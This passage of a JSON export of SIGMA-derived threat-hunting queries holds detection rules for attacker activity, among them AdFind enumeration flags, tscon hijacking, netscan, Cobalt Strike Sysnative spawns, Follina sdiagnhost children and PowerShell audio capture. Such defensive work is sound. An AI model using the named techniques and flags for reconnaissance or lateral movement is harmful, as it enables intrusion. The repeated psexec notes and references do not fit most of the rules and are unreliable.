\"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udfff\" or tgt.process.cmdline contains \"\u26f9\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc36\" or tgt.process.cmdline contains \"\ud83d\udc31\" or tgt.process.cmdline contains \"\ud83d\udc2d\" or tgt.process.cmdline contains \"\ud83d\udc39\" or tgt.process.cmdline contains \"\ud83d\udc30\" or tgt.process.cmdline contains \"\ud83e\udd8a\" or tgt.process.cmdline contains \"\ud83d\udc3b\" or tgt.process.cmdline contains \"\ud83d\udc3c\" or tgt.process.cmdline contains \"\ud83d\udc3b\u200d\u2744\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc28\" or tgt.process.cmdline contains \"\ud83d\udc2f\" or tgt.process.cmdline contains \"\ud83e\udd81\" or tgt.process.cmdline contains \"\ud83d\udc2e\" or tgt.process.cmdline contains \"\ud83d\udc37\" or tgt.process.cmdline contains \"\ud83d\udc3d\" or tgt.process.cmdline contains \"\ud83d\udc38\" or tgt.process.cmdline contains \"\ud83d\udc35\" or tgt.process.cmdline contains \"\ud83d\ude48\" or tgt.process.cmdline contains \"\ud83d\ude49\" or tgt.process.cmdline contains \"\ud83d\ude4a\" or tgt.process.cmdline contains \"\ud83d\udc12\" or tgt.process.cmdline contains \"\ud83d\udc14\" or tgt.process.cmdline contains \"\ud83d\udc27\" or tgt.process.cmdline contains \"\ud83d\udc26\" or tgt.process.cmdline contains \"\ud83d\udc24\" or tgt.process.cmdline contains \"\ud83d\udc23\" or tgt.process.cmdline contains \"\ud83d\udc25\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1234
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a tscon.exe start as LOCAL SYSTEM",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Suspicious TSCON Start as SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\") and tgt.process.image.path contains \"\\tscon.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1235
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of SoftPerfect's \"netscan.exe\". An application for scanning networks.\nIt is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1046"
            ],
            "name": "PUA - SoftPerfect Netscan Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\netscan.exe\" or tgt.process.displayName=\"Network Scanner\" or tgt.process.displayName=\"Application for scanning networks\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1236
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects active directory enumeration activity using known AdFind CLI flags",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087"
            ],
            "name": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"lockoutduration\" or tgt.process.cmdline contains \"lockoutthreshold\" or tgt.process.cmdline contains \"lockoutobservationwindow\" or tgt.process.cmdline contains \"maxpwdage\" or tgt.process.cmdline contains \"minpwdage\" or tgt.process.cmdline contains \"minpwdlength\" or tgt.process.cmdline contains \"pwdhistorylength\" or tgt.process.cmdline contains \"pwdproperties\") or tgt.process.cmdline contains \"-sc admincountdmp\" or tgt.process.cmdline contains \"-sc exchaddresses\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1237
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Process Creation Using Sysnative Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \":\\Windows\\Sysnative\\\" or tgt.process.image.path contains \":\\Windows\\Sysnative\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1238
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1218"
            ],
            "name": "Sdiagnhost Calling Suspicious Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\sdiagnhost.exe\" and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\taskkill.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\calc.exe\")) and (not ((tgt.process.image.path contains \"\\cmd.exe\" and tgt.process.cmdline contains \"bits\") or (tgt.process.image.path contains \"\\powershell.exe\" and (tgt.process.cmdline contains \"-noprofile -\" or tgt.process.cmdline contains \"-noprofile\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1239
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process related to rasdial.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious RASdial Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"rasdial.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1240
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects audio capture via PowerShell Cmdlet.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1123"
            ],
            "name": "Audio Capture via PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"WindowsAudioDevice-Powershell-Cmdlet\" or tgt.process.cmdline contains \"Toggle-AudioDevice\" or tgt.process.cmdline contains \"Get-AudioDevice \" or tgt.process.cmdline contains \"Set-AudioDevice \" or tgt.process.cmdline contains \"Write-AudioDevice \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1241
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks or terminal profiles.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Potentially Suspicious Child Process Of VsCode",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
